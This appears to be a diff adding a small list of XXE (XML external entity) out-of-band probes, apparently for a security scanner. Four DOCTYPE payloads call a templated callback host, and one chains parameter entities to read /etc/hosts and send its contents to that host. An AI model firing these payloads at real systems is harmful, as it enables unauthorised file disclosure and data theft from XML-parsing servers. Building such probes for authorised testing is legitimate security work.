@@ -1,0 +1,5 @@
+# Gated XXE OOB callback probes
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{callback_host}/xxe">]><x>&xxe;</x>
+<!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://{callback_host}/xxe.dtd">%xxe;]><x/>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "ftp://{callback_host}/xxe">]><x>&xxe;</x>
+<!DOCTYPE x [<!ENTITY % file SYSTEM "file:///etc/hosts"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{callback_host}/?x=%file;'>">%eval;%exfil;]><x/>
